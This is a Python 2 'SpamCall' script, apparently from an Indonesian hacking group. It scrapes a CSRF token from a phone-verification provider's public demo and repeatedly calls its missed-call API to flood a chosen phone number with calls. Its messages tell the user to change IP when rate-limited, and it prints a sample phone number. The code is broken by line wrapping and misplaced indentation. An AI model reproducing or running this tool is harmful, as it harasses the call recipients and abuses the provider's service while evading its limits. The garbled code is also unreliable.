#!/usr/bin/python2.7
# -*- coding: utf-8 -*-
G='\033[0;32m';C='\033[0;36m';W='\033[0;37m';R='\033[0
;31m'
import os,sys,time,re,requests
reload(sys)
sys.setdefaultencoding('utf8')
def citcall(nomor):
        r=requests.Session()
        home=r.get('https://www.citcall.com/demo/index
.php').text
        token=re.findall('id="csrf_token" value="(.*?)
"',home)[0]
        r.post('https://www.citcall.com/demo/verificat
ion.php',headers={'origin': 'https://www.citcall.com',
'content-type': 'application/x-www-form-urlencoded','u
ser-agent': 'Mozilla/5.0 (Linux; Android 10; M2004J19C
) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4
240.99 Mobile Safari/537.36','accept': 'text/html,appl
ication/xhtml+xml,application/xml;q=0.9,image/webp,ima
ge/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0
.9','sec-fetch-dest': 'document','referer': 'https://w
ww.citcall.com/demo/index.php'},data={'cellNo':nomor,'
csrf_token':token})
        call=r.post('https://www.citcall.com/demo/miss
callapi.php',headers={'accept': 'application/json, tex
t/javascript, */*; q=0.01','x-requested-with': 'XMLHtt
pRequest','user-agent': 'Mozilla/5.0 (Linux; Android 1
0; M2004J19C) AppleWebKit/537.36 (KHTML, like Gecko) C
hrome/86.0.4240.99 Mobile Safari/537.36','content-type
': 'application/x-www-form-urlencoded; charset=UTF-8',
'origin': 'https://www.citcall.com','sec-fetch-site':
'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest
': 'empty','referer': 'https://www.citcall.com/demo/ve
rification.php','accept-language': 'id-ID,id;q=0.9,en-
US;q=0.8,en;q=0.7'},data={'cid':nomor,'trying':'0','cs
rf_token':token}).json()
        if call['result']=='Success':
                print '%s[%s✓%s] Success spam %s'%(W,G
,W,nomor)
        else:
                print '%s[%sx%s] Limit, ganti IP '%(W,
R,W)
def main():
        os.system('cls' if os.name == 'nt' else 'clear
')
        print '''%s
   _____                       ______      ____
  / ___/____  ____ _____ ___  / ____/___ _/ / /
  \__ \/ __ \/ __ `/ __ `__ \/ /   / __ `/ / /
 ___/ / /_/ / /_/ / / / / / / /___/ /_/ / / /
/____/ .___/\__,_/_/ /_/ /_/\____/\__,_/_/_/
    /_/  %sCoded by ERRORCYBER.404-FAIL
    '''%(C,W)
        for spam in range(int(sys.argv[2])):
                citcall(sys.argv[1])
                time.sleep(5) #gk usah di ganti ya anj
                enk
                if __name__=='__main__':
                try:
                main()
                except IndexError:exit('%s[%s!%s] Use : python
                2 %s <nomor> <jumlahspam>\n    Example : python2 %s +6
                28996604527 3'%(W,R,W,sys.argv[0],sys.argv[0]))
                except requests.exceptions.ConnectionError:exi
                t('%s[%s!%s] Check internet'%(W,R,W))